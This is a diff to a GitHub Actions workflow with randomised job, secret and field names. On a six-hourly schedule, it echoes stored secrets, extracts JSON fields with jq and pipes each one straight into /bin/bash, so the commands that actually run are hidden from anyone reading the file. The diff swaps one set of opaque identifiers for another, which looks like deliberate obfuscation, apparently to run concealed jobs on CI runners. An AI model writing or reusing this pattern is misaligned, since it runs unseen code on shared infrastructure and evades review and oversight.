@@ -1,24 +1,25 @@
 name: chenhejiu6189
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 4/6 * * *'
+    - cron: '14 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: chenhejiu6189
         env:
-          hxtr4: ${{ secrets.hxtr4 }}
+          atmj03: ${{ secrets.atmj03 }}
         run: |
-          echo $hxtr4 | jq -r .lgzkl5292 | /bin/bash
-          echo $i67696 | jq -r .yqpif66344 | /bin/bash
-          echo $bq7826 | jq -r .oheq42751 | /bin/bash
-          echo $nvuyj0 | jq -r .nsf6915 | /bin/bash
-          echo $cf960 | jq -r .ubg124 | /bin/bash
-          echo $q3 | jq -r .dww6686 | /bin/bash
-          echo $ucsjp4184 | jq -r .luit9533 | /bin/bash
+          echo $atmj03 | jq -r .mtpc4 | /bin/bash
+          echo $wips1 | jq -r .vp918 | /bin/bash
+          echo $xqu59 | jq -r .cv6 | /bin/bash
+          echo $ab737 | jq -r .yukh86812 | /bin/bash
+          echo $z880 | jq -r .h544 | /bin/bash
+          echo $mdjc3 | jq -r .r72 | /bin/bash
+          echo $fzuge50 | jq -r .u052 | /bin/bash
+          echo $e1 | jq -r .kxrca62 | /bin/bash
 
